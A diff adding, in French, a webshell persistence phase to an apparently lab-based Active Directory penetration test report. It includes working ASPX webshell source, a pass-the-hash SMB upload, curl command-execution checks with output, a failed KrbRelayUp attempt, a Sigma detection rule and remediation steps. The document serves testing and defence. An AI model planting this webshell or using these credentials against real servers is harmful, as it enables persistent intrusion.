@@ -646,6 +646,98 @@ netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local -x '
 
 ---
 
+### Phase 5 — IIS WebShell (Post-Exploitation CASTELBLACK)
+
+CASTELBLACK héberge un serveur IIS avec ASP.NET. Avec un accès admin obtenu via noPac, on dépose un webshell ASPX dans le répertoire IIS pour obtenir un accès persistant indépendant des credentials AD.
+
+**Pourquoi c'est utile** : même si les mots de passe et les hash sont rotés, le webshell reste actif tant que le fichier n'est pas supprimé. C'est un mécanisme de persistance web classique, documenté dans MITRE ATT&CK T1505.003.
+
+**1. Vérification IIS actif**
+
+```bash
+netexec smb 192.168.10.22 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'dir C:\inetpub\wwwroot\'
+```
+
+```
+Directory of C:\inetpub\wwwroot
+12/03/2025  03:56 PM    <DIR>          aspnet_client
+12/03/2025  03:56 PM    <DIR>          bin
+12/03/2025  01:11 PM               616 Default.aspx
+12/03/2025  03:42 PM               703 iisstart.htm
+12/03/2025  01:11 PM               149 index.html
+12/03/2025  01:11 PM             1,199 Web.config
+```
+
+IIS actif avec ASP.NET.
+
+**2. Création et upload du webshell**
+
+```bash
+cat > /tmp/shell.aspx << 'EOF'
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.Arguments = "/c " + Request["cmd"];
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.Start();
+Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+%>
+EOF
+```
+
+Upload via SMB :
+
+```bash
+impacket-smbclient north.sevenkingdoms.local/administrator@192.168.10.22 -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4'
+# use C$
+# cd inetpub\wwwroot
+# put /tmp/shell.aspx
+```
+
+**3. Validation RCE via webshell**
+
+```bash
+curl -k 'http://192.168.10.22/shell.aspx?cmd=whoami'
+```
+
+```
+<pre>iis apppool\defaultapppool
+</pre>
+```
+
+```bash
+curl -k 'http://192.168.10.22/shell.aspx?cmd=hostname%20%26%26%20ipconfig'
+```
+
+```
+<pre>castelblack
+Windows IP Configuration
+Ethernet adapter Ethernet:
+   IPv4 Address. . . . . . . . . . . : 192.168.10.22
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.10.1
+</pre>
+```
+
+RCE confirmée en tant que `iis apppool\defaultapppool`.
+
+**4. Cleanup**
+
+```bash
+netexec smb 192.168.10.22 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'del C:\inetpub\wwwroot\shell.aspx'
+```
+
+---
+
+### Annexe — KrbRelayUp (non exploitable)
+
+KrbRelayUp combine un relay LDAP local via DCOM + RBCD pour escalader de Domain User à SYSTEM sur la machine locale. Les conditions théoriques sont réunies sur CASTELBLACK (LDAP signing non enforced, channel binding "Never", MAQ=10). L'outil échoue cependant à créer le compte machine via le relay interne : `Could not add new computer account: An operation error occurred.` C'est une limitation connue du relay DCOM→LDAP sur certaines versions de WS2019.
+
+---
+
 ## Credentials récupérés
 
 | Compte | Hash NTLM | Type | Domaine |
@@ -689,6 +781,26 @@ tags:
     - cve-2021-1675
 ```
 
+```yaml
+title: ASPX WebShell Created in IIS Directory
+id: sc-ad-005-webshell
+status: experimental
+description: Détecte la création d'un fichier ASPX dans le répertoire IIS wwwroot
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 11
+        TargetFilename|contains: '\inetpub\wwwroot\'
+        TargetFilename|endswith: '.aspx'
+    condition: selection
+level: critical
+tags:
+    - attack.persistence
+    - attack.t1505.003
+```
+
 ---
 
 ## Remédiation
@@ -699,6 +811,8 @@ tags:
 | CRITIQUE | Appliquer KB5004945 + KB5004946 | Windows Update / WSUS | 0-24h |
 | CRITIQUE | Rotation krbtgt essos.local (x2) | `Set-ADAccountPassword -Identity krbtgt` | 0-24h |
 | ELEVE | Bloquer les chemins UNC pour le spooler | GPO — Point and Print Restrictions | J+1 |
+| ELEVE | Déployer FIM sur `C:\inetpub\wwwroot\` | Sysmon Event ID 11 + alerte SIEM | J+1 |
+| ELEVE | Restreindre droits d'écriture répertoire IIS | ACL — supprimer WRITE pour non-admins | J+1 |
 
 ### Commande de désactivation immédiate sur tous les DC
 
